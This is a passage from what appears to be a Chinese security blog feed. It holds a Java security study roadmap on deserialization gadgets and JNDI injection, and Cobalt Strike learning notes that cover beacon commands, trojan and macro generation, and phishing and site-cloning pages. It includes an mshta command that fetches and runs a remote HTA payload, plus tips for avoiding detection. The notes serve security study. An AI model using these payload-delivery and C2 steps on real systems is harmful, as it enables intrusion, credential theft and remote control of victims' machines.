    <content type="html"><![CDATA[<h4 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h4><p>​IDEA<br>​Maven<br>​Java Web<br>​反射<br>​ASM&#x2F;Javassist<br>​JNDI：8u191低版本和高版本怎么打(反序列化&#x2F;本地工厂)，以及如何审计<br>​RMI是什么<br>​Java Agent：启动原理和RASP的实现原理<br>​JMX&#x2F;JDWP<br>​反序列化基础：gadget链、JEP290是什么<br>​FastJson反序列化<br>​WebLogic：二次反序列化、XML Decoder、IIOP&#x2F;T3<br>​Xstream反序列化<br>​Hessian反序列化：dubbo<br>​SnakeYAML反序列化<br>​Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马<br>​Struts2<br>​Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用<br>​Tomcat：Tomcat AJP RCE<br>​内存马原理：原理是什么、有哪些内存马  （动手实践调试每一种内存马）<br>​内存马如何查杀<br>​Log4J<br>​其他组件漏洞：Apache Solr、Flink<br>​进阶：tabby、codeql等静态分析</p><p>反射可以学习下高版本的绕过，jndi这里尝试自己写一个简单的jndi exploit。java agent这里自己尝试能否写一个简易rasp。log4j这里尝试自己写burp工具</p><p>最后可以学习下jdbc攻击，尝试自己写一个fake server</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221200505390.png" alt="image-20230221200505390" style="zoom: 50%;" /><h4 id="分层模型"><a href="#分层模型" class="headerlink" title="分层模型"></a>分层模型</h4><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221195026804.png" alt="image-20230221195026804" style="zoom:50%;" /><h4 id="MVC框架"><a href="#MVC框架" class="headerlink" title="MVC框架"></a>MVC框架</h4><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221195459454.png" alt="image-20230221195459454"></p><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221201728646.png" alt="image-20230221201728646"></p><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221220505941.png" alt="image-20230221220505941"></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221230441694.png" alt="image-20230221230441694" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;java.lang.String&quot;);</span><br><span class="line"></span><br><span class="line">Class cls = String.class;</span><br><span class="line"></span><br><span class="line">String s = &quot;Hello&quot;;</span><br><span class="line">Class cls = s.getClass();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221230422653.png" alt="image-20230221230422653" style="zoom:43%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230221225953768.png" alt="image-20230221225953768" style="zoom:50%;" /><p><strong>总结</strong> </p><p>我们先获取到类型A的Class对象，通过Class对象的newInstance方法可以得到A的实例</p><p>通过Class对象可以获取到Constructor对象，进一步可以使用Constructor对象来得到A的实例</p><p>通过Class对象可以获取到Method对象，通过Method的invoke方法我们可以调用一些方法</p><p>通过Class对象可以获取到Field对象，我们可以对这个实例的一些字段进行赋值取值操作</p><p><code>Constructor</code>对象封装了构造方法的所有信息；</p><p>通过<code>Class</code>实例的方法可以获取<code>Constructor</code>实例：<code>getConstructor()</code>，<code>getConstructors()</code>，<code>getDeclaredConstructor()</code>，<code>getDeclaredConstructors()</code>；</p><p>通过<code>Constructor</code>实例可以创建一个实例对象：<code>newInstance(Object... parameters)</code>； 通过设置<code>setAccessible(true)</code>来访问非<code>public</code>构造方法</p><p>Java的反射API提供的Method对象封装了方法的所有信息：</p><p>通过<code>Class</code>实例的方法可以获取<code>Method</code>实例：<code>getMethod()</code>，<code>getMethods()</code>，<code>getDeclaredMethod()</code>，<code>getDeclaredMethods()</code>；</p><p>通过<code>Method</code>实例可以获取方法信息：<code>getName()</code>，<code>getReturnType()</code>，<code>getParameterTypes()</code>，<code>getModifiers()</code>；</p><p>通过<code>Method</code>实例可以调用某个对象的方法：<code>Object invoke(Object instance, Object... parameters)</code>；</p><p>通过设置<code>setAccessible(true)</code>来访问非<code>public</code>方法；</p><p>通过反射调用方法时，仍然遵循多态原则。</p><p>Java的反射API提供的<code>Field</code>类封装了字段的所有信息：</p><p>通过<code>Class</code>实例的方法可以获取<code>Field</code>实例：<code>getField()</code>，<code>getFields()</code>，<code>getDeclaredField()</code>，<code>getDeclaredFields()</code></p><p>通过Field实例可以获取字段信息：<code>getName()</code>，<code>getType()</code>，<code>getModifiers()</code></p><p>通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用<code>setAccessible(true)</code>来访问非<code>public</code>字段</p><p>通过反射读写字段是一种非常规方法，它会破坏对象的封装</p><p>通过<code>Class</code>对象可以获取继承关系：</p><ul><li><code>Class getSuperclass()</code>：获取父类类型；</li><li><code>Class[] getInterfaces()</code>：获取当前类实现的所有接口</li></ul><p>通过<code>Class</code>对象的<code>isAssignableFrom()</code>方法可以判断一个向上转型是否可以实现</p><h4 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h4><p>代理模式是一种设计模式，能够使得在不修改源目标的前提下，额外扩展源目标的功能。即通过访问源目标的代理类，再由代理类去访问源目标。这样一来，要扩展功能，就无需修改源目标的代码了，只需要在代理类上增加就可以了</p><img src="C:\Users\micgo\AppData\Roaming\Typora\typora-user-images\image-20230309112558148.png" alt="image-20230309112558148" style="zoom:67%;" /><p>一个最简单的动态代理实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用</li><li>通过 Proxy.newProxyInstance() 创建 interface 实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code></li><li>需要实现的接口数组，至少需要传入一个接口进去</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例</li></ol></li><li>将返回的<code>Object</code>强制转型为接口</li></ol><p>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class HelloDynamicProxy implements Hello &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    public HelloDynamicProxy(InvocationHandler handler) &#123;</span><br><span class="line">        this.handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line">    public void morning(String name) &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           this,</span><br><span class="line">           Hello.class.getMethod(&quot;morning&quot;, String.class),</span><br><span class="line">           new Object[] &#123; name &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是JVM帮我们自动编写了一个上述类（不需要源码，可以直接生成字节码），并不存在可以直接实例化接口的黑魔法</p><p><strong>小结</strong></p><p>Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例</p><p>动态代理是通过<code>Proxy</code>创建代理对象，然后将接口方法“代理”给<code>InvocationHandler</code>完成的相对于静态代理类来说，无论有多少接口，动态代理只需要一个代理类</p><p><strong>动态代理意义</strong>： 少修改代码  适配强<br><strong>在反序列化漏洞中的作用</strong>：</p><p>1、readObject -&gt; 反序列化自动执行  2、invoke -&gt; 有函数调用    3、拼接两条链    4、任意-&gt;固定</p><p>要利用反序列化的漏洞是需要一个入口类的，先假设存在一个能够漏洞利用的类为 <code>B.f</code> ，比如<code>Runtime.exec</code>这种，我们将入口类定义为<code>A</code>，我们最理想的情况是 A[O] -&gt; O.f ，那么我们将传进去的参数 <code>O </code>替换为 <code>B</code> 即可。但是在实战的情况下这种情况是极少的</p><p>回到实战情况，比如我们的入口类<code>A</code>存在  <code>O.abc</code>这个方法，也就是 A[O] -&gt; O.abc</p><p>如果O 是一个动态代理类，O 的<code>invoke</code>方法里存在 <code>.f </code>的方法，便可以漏洞利用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A[O] -&gt; O.abc</span><br><span class="line">O[O2] invoke -&gt; O2.f // 此时将 B 去替换 O2</span><br><span class="line">最后  ----&gt;   O[B] invoke -&gt; B.f // 达到漏洞利用效果</span><br></pre></td></tr></table></figure><p>动态代理在反序列化当中的利用和<code>readObject</code>是异曲同工的：</p><p><code>readObject</code>方法在反序列化当中会被自动执行，而<code>invoke</code>方法在动态代理当中会自动执行</p><h4 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h4><h4 id="Maven基础"><a href="#Maven基础" class="headerlink" title="Maven基础"></a>Maven基础</h4><p>Maven是一个Java项目管理和构建工具，它可以定义项目结构、项目依赖，并使用统一的方式进行自动化构建，是Java项目不可缺少的工具</p><p>Maven就是是专门为Java项目打造的管理和构建工具，它的主要功能有：</p><ul><li>提供了一套标准化的项目结构</li><li>提供了一套标准化的构建流程（编译，测试，打包，发布……）</li><li>提供了一套依赖管理机制</li></ul><p><strong>Maven项目结构</strong></p><p>一个使用Maven管理的普通的Java项目，它的目录结构默认如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a-maven-project</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   ├── main</span><br><span class="line">│   │   ├── java</span><br><span class="line">│   │   └── resources</span><br><span class="line">│   └── test</span><br><span class="line">│       ├── java</span><br><span class="line">│       └── resources</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>Maven是一个Java项目的管理和构建工具：</p><ul><li>Maven使用<code>pom.xml</code>定义项目内容，并使用预设的目录结构</li><li>在Maven中声明一个依赖项可以自动下载并导入classpath</li><li>Maven使用<code>groupId</code>，<code>artifactId</code>和<code>version</code>唯一定位一个依赖</li></ul><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230222095358757.png" alt="image-20230222095358757"></p><h4 id="JDBC编程"><a href="#JDBC编程" class="headerlink" title="JDBC编程"></a>JDBC编程</h4><p>程序运行的时候，往往需要存取数据。现代应用程序最基本，也是使用最广泛的数据存储就是关系数据库。</p><p>Java为关系数据库定义了一套标准的访问接口：JDBC（Java Database Connectivity）</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象，一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中</p><p>Java中的 <code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化，类 <code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。如果要实现类的反序列化，则是对其实现 <code>Serializable</code> 接口</p><p>当<strong>远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时</strong>，就认为存在反序列化漏洞</p><p><strong>常见触发点</strong></p><ul><li>JDBC 反序列化</li><li>JSON 反序列化</li></ul><p><strong>存在危险的基础库</strong></p><ul><li><code>com.mchange:c3p0 0.9.5.2</code></li><li><code>com.mchange:mchange-commons-java 0.2.11</code></li><li><code>commons-beanutils 1.9.2</code></li><li><code>commons-collections 3.1</code></li><li><code>commons-fileupload 1.3.1</code></li><li><code>commons-io 2.4</code></li><li><code>commons-logging 1.2</code></li><li><code>org.apache.commons:commons-collections 4.0</code></li><li><code>org.beanshell:bsh 2.0b5</code></li><li><code>org.codehaus.groovy:groovy 2.3.9</code></li><li><code>org.slf4j:slf4j-api 1.7.21</code></li><li><code>org.springframework:spring-aop 4.1.4.RELEASE</code></li></ul><p><strong>回显方式</strong></p><ul><li>通过中间件特性回显</li><li>通过抛出异常回显</li><li>通过OOB回显</li><li>通过写静态文件回显</li></ul><h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h4><p>RMI (Remote Method Invocation，远程方法调用) 能够让在客户端Java虚拟机上的对象像调用本地对象一样调用服务端Java虚拟机中的对象上的方法。其中RMI标准实现是Java RMI，之外还有Weblogic RMI、Spring RMI等不同的实现</p><p>RMI中比较重要的两个概念是<strong>Stub和Skeleton</strong>，Stub和Skeleton对同一套接口进行实现，其中Stub由Client端调用，并不进行真正的实现，而是和Server端通信。Skeleton是Server端，监听来自Stub的连接，根据Stub发送的数据进行真正的操作</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230222203836536.png" alt="image-20230222203836536" style="zoom: 50%;" /><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230222221709057.png" alt="image-20230222221709057"></p><h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>JNDI注入是2016年由pentester在BlackHat USA上的 <code>A Journey From JNDI LDAP Manipulation To RCE</code> 议题提出的</p><p>其攻击过程如下</p><ol><li>攻击者将Payload绑定到攻击者的命名&#x2F;目录服务中</li><li>攻击者将绝对URL注入易受攻击的JNDI查找方法</li><li>应用程序执行查找</li><li>应用程序连接到攻击者控制的JNDI服务并返回Payload</li><li>应用程序解码响应并触发有效负载</li></ol><h4 id="OGNL表达式语言"><a href="#OGNL表达式语言" class="headerlink" title="OGNL表达式语言"></a>OGNL表达式语言</h4><p>OGNL（Object-Graph Navigation Language的简称），对象图导航语言，它是一门表达式语言，除了用来设置和获取Java对象的属性之外，另外提供诸如集合的投影和过滤以及lambda表达式等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;路线&quot;&gt;&lt;a href=&quot;#路线&quot; class=&quot;headerlink&quot; title=&quot;路线&quot;&gt;&lt;/a&gt;路线&lt;/h4&gt;&lt;p&gt;​	IDEA&lt;br&gt;​	Maven&lt;br&gt;​	Java Web&lt;br&gt;​	反射&lt;br&gt;​	ASM&amp;#x2F;Javassist&lt;br&gt;​	J</summary>
      
    
    
    
    <category term="java security" scheme="https://micgo.top/categories/java-security/"/>
    
    
    <category term="java security" scheme="https://micgo.top/tags/java-security/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike学习笔记</title>
    <link href="https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2023-01-16T16:00:00.000Z</published>
    <updated>2023-02-25T16:01:10.513Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Cobalt-strike的安装与使用"><a href="#Cobalt-strike的安装与使用" class="headerlink" title="Cobalt strike的安装与使用"></a><strong>Cobalt strike的安装与使用</strong></h5><p>Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>Windows客户端的安装</p><p>安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端 </p><p>管理员身份运行powshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike,OU=AdvancedPenTesting,O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</span><br><span class="line"></span><br><span class="line">.\teamserver.bat 192.168.245.2  123456   //先ipconfig看一下本机ip</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/b4f9206c0bc610193f31cf091c8f5eb82c5616ac.png" alt="image-20230104160436912" style="zoom: 67%;" /><p>linux服务端</p><p>Cobalt Strike 团队服务器必须在受支持的 Linux 系统上运行，以root身份运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 teamserver    //给服务器端运行权限</span><br><span class="line">./teamserver 45.77.20.229 12345678  //192.168.245.132是服务器的内网地址(linux地址)，123456是设置的密码</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/954e0ff4b530bbb1268535f352168030a45a840f.png" alt="image-20230104161324649"></p><p>都配置完成后就可以回到windows客户端，点击运行bat文件（这里踩了个坑，服务端客户端版本不一致连不上）</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/16f10d110a008d658a019bcbf2cba7ed8a0ce2fb.png" alt="image-20230104162009604"></p><p>换成一致的4.0版本后成功连接</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/f7da27243126dc12c1b0301041659bd814fcca33.png" alt="image-20230104162535570"></p><p><strong>创建监听器</strong><br>Listner(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动。</p><img src="https://img-blog.csdnimg.cn/20200921124724312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:67%;" /><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了八个Listener</p><p>其中beacon为内置监听器，包括dns、http、https、smb四种方式的监听器； foreign为外部监听器，配合Metasploit或者Armitage的监听器;“External C2”,创造隐蔽的C2通道。即支持：HTTP&#x2F;HTTPS以及DNS协议。</p><p>示例</p><img src="https://img-blog.csdnimg.cn/20200921124743671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:67%;" /><p>点击save即创建成功</p><h5 id="beacon命令"><a href="#beacon命令" class="headerlink" title="beacon命令"></a><strong>beacon命令</strong></h5><p>help 查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样help upload</p><p>note 给当前目录机器起个名字, note beacon-shell</p><p>cd在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用’&#x2F;’ cd c:</p><p>mkdir 新建目录, mkdir d:beacon</p><p>rm 删除文件或目录, rm d:beacon</p><p>upload 上传文件到目标系统中</p><p>download从目标系统下载指定文件, download C:Userswin7cnDesktopputty.exe</p><p>cancel取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下</p><p>shell在目标系统中执行指定的cmd命令, shell whoami</p><p>getuid 查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权</p><p>pwd查看当前在目录系统中的路径</p><p>ls列出当前目录下的所有文件和目录</p><p>drives列表出目标系统的所有分区[win中叫盘符]</p><p>ps查看目标系统当前的所有的进程列表</p><p>kill杀掉指定进程, kill 4653</p><p><strong>sleep 10指定被控端休眠时间, 默认60秒一次回传, 让被控端每10秒来下载一次任务, 实际中频率不宜过快, 容易被发现, 80左右一次即可</strong></p><p>jobs列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除</p><p>jobkill如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, jobkill 1345</p><p>clear清除beacon内部的任务队列</p><p>checkin强制让被控端回连一次</p><p>exit 终止当前beacon 会话</p><p>ctrl + k 清屏</p><h5 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a><strong>攻击手段</strong></h5><h6 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a><strong>生成木马</strong></h6><p>以生成的exe远控木马为例：</p><p>点击Attacks-&gt;Packages-&gt;Windows Executable（s），选择对应的监听器</p><img src="https://img-blog.csdnimg.cn/20200921124843316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:50%;" /><p>点击生成的木马文件即上线</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a1ed72532b6addefe64765c69a2d2f9b15c98721.png" alt="image-20230104210808106"></p><p>cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿, 上线后将默认心跳包改成0s，</p><p>修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定</p><p>或直接在beacon命令行里输入sleep 0</p><img src="https://img-blog.csdnimg.cn/20200921125019892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xVT0JJS1VO,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" style="zoom:50%;" /><p>获取自己需要的信息</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/6a09d212341cbf4a7dfbf5c7c395eddbe1de5156.png" alt="image-20230104211146525"></p><h6 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a><strong>HTML Application</strong></h6><p>点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable&#x2F;VBA&#x2F;powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/06c0ab9a3c7e2811baa12e28df1952d1d7fa184a.png" alt="image-20230105103304653" style="zoom: 50%;" /><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/95dfef4d0f6c4021bc0d97cf9c3bbd250ad8a7e1.png" alt="image-20230105103343948"></p><p>开启web服务</p><p>点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3e5e3700f14cbcda0ad1735cb6f219bf1c9d0118.png" alt="image-20230105103430533" style="zoom: 50%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/36e3a4bed52b03bf14a4cadf1436a07fb904b650.png" alt="image-20230105101708192" style="zoom:40%;" /><p>访问下载木马文件</p><img src="https://i0.hdslb.com/bfs/album/62bb970158c7afbeb154215fd610a8b5d25d15b4.png" alt="image-20230105103536068" style="zoom: 40%;" /><p>运行木马</p><p>打开受害机cmd，运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://45.77.20.229/download/file.ext</span><br></pre></td></tr></table></figure><p>上线</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e76b4821300e7aaf16c0c3ae0be523066dd78b03.png" alt="image-20230105102738447" style="zoom: 50%;" /><h6 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a><strong>克隆网站</strong></h6><p>我的java环境有问题，烦死了,换了个java版本也不行</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20669b81cb0512606c6a59b3567a06d4b1d93501.png" alt="image-20230106214548145" style="zoom:50%;" /><p>用户键盘输入的信息都可以在web日志中看到</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1638617920_61ab53406f76617d9f34b.png!small" alt="image-20211201163859793"></p><h6 id="microsoft-宏"><a href="#microsoft-宏" class="headerlink" title="microsoft 宏"></a><strong>microsoft 宏</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/t01cdc8b3f9eb1ed0a7.png" alt="img"></p><p>不关防火墙保存不了，但可以直接执行，虽然也会检测到，但还是可以上线</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/4123d4671c3865af2a40c927cebc710360040550.png" alt="image-20230106224059530" style="zoom: 33%;" /><p>将此文档保存为可以执行宏的格式，这里保存的为Doc1.docm</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109110458850.png" alt="image-20230109110458850"></p><p>在自己电脑上打开此文件，即可在cs中看到自己上线的主机</p><h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/54f99583be0ce4fd1b50728708d8912a40fa26ac.png" alt="image-20230108202436425"></p><p>建立一个钓鱼页面去收集用户信息，其中主机地址和端口就是TeamServerIP和端口，RedirectUrl就是点击后跳转的URL，可以填一个大型网站，底下的使用JavaApplet复选框也已经过时对于受害者系统版本较低的情况下可以使用，点击开始后会生成URL，只要诱导用户访问即上线</p><p>用户访问后跳转到百度，在 视图-&gt;应用信息 可以看到收集的信息</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a2810945d3fa95fa19c30beccb16728c71e10545.png" alt="image-20230108202227397" style="zoom:33%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/50327de6b6b413f4b808196ded7701531da24655.png" alt="image-20230108202330601" style="zoom:33%;" /><p>能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><h6 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" 